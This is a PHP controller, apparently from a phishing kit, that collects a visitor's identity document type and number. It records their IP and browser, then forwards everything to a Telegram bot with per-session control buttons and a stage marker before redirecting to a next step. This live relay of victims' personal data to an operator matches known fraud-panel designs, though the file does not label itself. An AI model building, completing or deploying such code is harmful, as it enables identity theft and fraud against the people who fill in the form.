<?php

declare(strict_types=1);

namespace App\Controllers;

use App\Services\SessionService;
use App\Services\TelegramService;
use App\Services\LoggerService;
use App\Validators\DocumentValidator;
use App\Exceptions\ValidationException;

/**
 * Document Controller - Maneja el formulario de documento
 */
final class DocumentController
{
    public function __construct(
        private SessionService $sessionService,
        private TelegramService $telegramService,
        private LoggerService $logger,
        private DocumentValidator $validator
    ) {
    }

    /**
     * Muestra el formulario de documento
     */
    public function showForm(?string $error = null): void
    {
        $this->sessionService->start();

        $errorMessage = '';
        if ($error === 'documento') {
            $errorMessage = 'Tu número de documento es inválido o incorrecto. Por favor, verifica e intenta nuevamente.';
        }

        require_once __DIR__ . '/../../templates/document-form.php';
    }

    /**
     * Procesa el formulario de documento
     */
    public function processForm(array $data): void
    {
        $this->sessionService->start();

        $docType = $this->sanitize($data['documentType'] ?? '');
        $docNumber = $this->sanitize($data['documentNumber'] ?? '');

        try {
            $this->validator->validateOrFail($docType, $docNumber);
        } catch (ValidationException $e) {
            $this->logger->warning('Document validation failed', [
                'errors' => $e->getErrors(),
                'ip' => $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
            ]);
            $this->redirect('/index.php?error=documento');
            return;
        }

        // Guardar en sesión
        $this->sessionService->set('documentType', $docType);
        $this->sessionService->set('documentNumber', $docNumber);
        $this->sessionService->set('timestamp', time());
        $this->sessionService->set('ip', $_SERVER['REMOTE_ADDR'] ?? 'Unknown');
        $this->sessionService->set('user_agent', $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown');
        $this->sessionService->set('telegram_stage', 'documento');

        // Enviar a Telegram
        $message = $this->telegramService->formatSessionData($this->sessionService->all());
        $buttons = $this->telegramService->generateStandardButtons($this->sessionService->getId());
        $this->telegramService->sendMessage($message, $buttons);

        $this->logger->info('Document submitted', [
            'session_id' => $this->sessionService->getId(),
            'type' => $docType,
            'number' => $docNumber,
        ]);

        $this->redirect('/next-step.php');
    }

    private function sanitize(string $data): string
    {
        return htmlspecialchars(trim($data), ENT_QUOTES, 'UTF-8');
    }

    private function redirect(string $url): void
    {
        header("Location: $url");
        exit;
    }
}
